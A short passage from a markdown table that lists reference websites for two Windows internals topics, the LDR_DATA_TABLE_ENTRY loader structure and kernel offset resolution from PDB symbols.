| LDR_DATA_TABLE_ENTRY | geoffchappell.com, vergiliusproject.com, malwaretech.com/wiki/locating-modules-via-the-peb-x64 |
| PDB offset resolution | medium.com/@s12deff/kernel-dynamic-offset-resolution-using-pdb-symbols |
